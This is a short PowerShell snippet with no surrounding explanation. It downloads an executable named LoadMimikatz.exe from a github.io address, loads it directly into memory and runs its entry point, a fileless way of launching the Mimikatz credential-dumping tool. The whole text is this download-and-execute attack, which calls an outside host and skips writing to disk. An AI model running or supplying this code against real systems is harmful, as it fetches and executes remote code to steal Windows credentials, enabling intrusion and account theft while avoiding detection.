$a = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/LoadMimikatz.exe")
$b = [System.Reflection.Assembly]::Load($a)
$b.EntryPoint.Invoke($null, $null)
